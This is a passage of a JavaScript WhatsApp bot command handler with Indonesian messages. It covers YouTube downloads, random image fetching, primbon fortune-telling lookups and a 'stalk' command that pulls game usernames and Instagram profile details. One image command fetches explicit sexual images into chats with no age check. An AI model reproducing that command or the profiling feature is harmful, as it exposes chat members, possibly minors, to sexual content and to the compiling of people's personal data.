                chika.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                chika.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                chika.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                chika.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                chika.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
                m.reply(mess.wait)
                chika.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                chika.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                chika.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: chika.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: chika.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: chika.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                chika.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                chika.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                chika.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                chika.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    chika.sendMedia(m.chat, anu.caption.profile_hd, '', `⭔ Full Name : ${anu.caption.full_name}\n⭔ User Name : ${anu.caption.user_name}\n⭔ ID ${anu.caption.user_id}\n⭔ Followers : ${anu.caption.followers}\n⭔ Following : ${anu.caption.following}\n⭔ Bussines : ${anu.caption.bussines}\n⭔ Profesional : ${anu.caption.profesional}\n⭔ Verified : ${anu.caption.verified}\n⭔ Private : ${anu.caption.private}\n⭔ Bio : ${anu.caption.biography}\n⭔ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
